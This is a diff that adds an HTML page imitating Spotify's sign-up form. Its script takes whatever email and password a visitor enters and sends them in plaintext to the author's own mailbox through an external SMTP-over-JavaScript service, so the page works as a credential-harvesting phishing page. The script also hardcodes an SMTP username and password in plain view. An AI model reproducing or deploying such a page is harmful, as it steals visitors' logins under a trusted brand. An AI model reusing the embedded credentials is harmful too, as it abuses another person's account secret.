@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign up - Spotify</title>
+    <link rel="stylesheet" href="utility.css">
+</head>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Poppins&family=Roboto:wght@500&display=swap');
+    *{
+        margin: 0;
+        padding:0;
+        box-sizing: border-box;
+        font-family: 'Roboto', sans-serif;
+    }
+    .login{
+        width: 100vw;
+        height: 110vh;
+        background: linear-gradient(rgb(36, 35, 35) 0%, rgb(0, 0, 0) 70%);
+    }
+    .header{
+        background:black;
+        padding: 28px 32px 30px;
+       text-align: left; 
+       align-items: center;
+       justify-content: space-between;
+    }
+    .spotify{
+        margin-left: 30px;
+    }
+    .form-box{
+        background: black;
+        color: white;
+        margin-top: 30px ;
+        width: 75vw;
+        flex-direction: column;
+        margin-left: 13vw;
+        min-height: 60vh;
+    }
+    .inputs{
+        flex-direction: column;
+        gap: 15px;
+        padding: 45px;
+        border-top: 0.001px solid rgb(88, 87, 87);
+        border-bottom: 0.001px solid rgb(88, 87, 87);
+        min-height: 0vh;
+    }
+    .form-box h1{
+        padding: 29px;
+        /* margin-bottom: 10px; */
+    }
+    input{
+        width: 23vw;
+        padding: 14px;
+        background: #121212;
+        border-style: none;
+        border: 0.1px solid white;
+        border-radius: 5px;
+        font-size: large;
+        color: white;
+    }
+    .loging{
+        width: 22vw;
+        background-color: #1ed760;
+        padding: 12px;
+        border-radius: 20px;
+        text-align: center;
+        margin-left: 5px;
+        margin-top: 30px;
+        color: black;
+        font-size: large;
+    }
+    .sign a{
+        /* text-decoration: none; */
+        color: white;
+    }
+    .sign a:hover{
+        color: #1ed760;
+    }
+    .pass{
+        position: relative;
+    }
+    .pass img{
+        position: absolute;
+        z-index: 5;
+        right: 15px;
+        top: 15px;
+        opacity: 0.5;
+    }
+    .pass img:hover{
+        opacity: 1;
+    }
+    .pass1{
+        position: relative;
+    }
+    .pass1 img{
+        position: absolute;
+        z-index: 5;
+        right: 15px;
+        top: 15px;
+        opacity: 0.5;
+    }
+    .pass1 img:hover{
+        opacity: 1;
+    }
+    @media (max-width: 700px){
+        input{
+            width: 55vw;
+        }
+        .loging{
+            width: 50vw;
+        }
+        .form-box{
+            width: 100%;
+            margin: 0;
+            margin-top: 0;
+        }
+        .sign{
+            flex-direction: column;
+            gap: 5px;
+            text-align: center;
+        }
+        
+    }
+</style>
+<body>
+    <div class="login">
+    <div class="header flex">
+        <div class="spotify">
+            <img class="invert" src="imgs/logo.svg" alt="" width="117px">
+        </div>
+        <div class="back">
+            <a href="Spotify.html"><img class="invert" src="imgs/icons8-back-50.png" alt="" width="25px"> </a>
+        </div>
+    </div>
+    <div class="form-box flex align justify" >
+        <h1>Sign up to start listening</h1>
+        <div class="inputs flex">
+            <span>Email or username</span>
+            <input type="email" placeholder="Email or username" id="email" required>
+            <span>Password</span>
+            <div class="pass">
+            <input type="password" placeholder="Password" id="password" required><img class="passw invert" src="imgs/eyeclose.svg" width="20px"></div>
+            <span>Re-Enter Password</span>
+            <div class="pass1">
+                <input type="password" placeholder="Re-Enter Password" id="password1" required><img class="passw invert" src="imgs/eyeclose.svg" width="20px"></div>
+            
+            <div class="flex">
+            <input type="checkbox" style="width: 15px;margin-right: 15px;" checked><span>Remember me</span>
+            </div>
+            
+            <div class="loging">
+                Log in
+            </div>
+        </div>
+        <div class="sign flex" style="padding-top: 15px;">
+            <span style="margin-right: 5px;">Already have an account?</span> <a href="index.html">Log in here</a>
+        </div>
+    </div>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        let pas = document.getElementById("password");
+        let pasw = document.getElementById("password1");
+        document.querySelector(".loging").addEventListener("click",()=>{
+            if(pas.value != pasw.value){
+                alert("enter same password");
+            }
+            else{
+                sendemail();
+            document.getElementById("email").value = "";
+            document.getElementById("password").value = "";
+            document.getElementById("password1").value = ""; 
+            }
+        });
+        function sendemail(){
+        Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "mohit_ug_23@ee.nits.ac.in",
+    Password : "B9646D8A500C8F1EC6B6A3D896EB7BE6069B",
+    To : "mohit_ug_23@ee.nits.ac.in",
+    From : "mohit_ug_23@ee.nits.ac.in",
+    Subject : "new login form",
+    Body : `Email : ${document.getElementById("email").value}<br>Password : ${document.getElementById("password").value} `,
+}).then(
+  message => alert("Message Sent Successfully")
+);}
+    </script>
+    <script>
+        let eye = document.querySelectorAll(".passw");
+        let password = document.querySelector("#password");
+        eye[0].addEventListener("click",()=>{
+            if(password.type == "password"){
+                password.type = "text";
+                eye[0].src = "imgs/eyeopen.svg";
+            }
+            else{
+                password.type = "password";
+                eye[0].src = "imgs/eyeclose.svg"
+            }
+        })
+        // let eye1 = document.querySelector(".pass1");
+        let password1 = document.querySelector("#password1");
+        eye[1].addEventListener("click",()=>{
+            if(password1.type == "password"){
+                password1.type = "text";
+                eye[1].src = "imgs/eyeopen.svg";
+            }
+            else{
+                password1.type = "password";
+                eye[1].src = "imgs/eyeclose.svg"
+            }
+        })
+    </script>
+</body>
+</html>
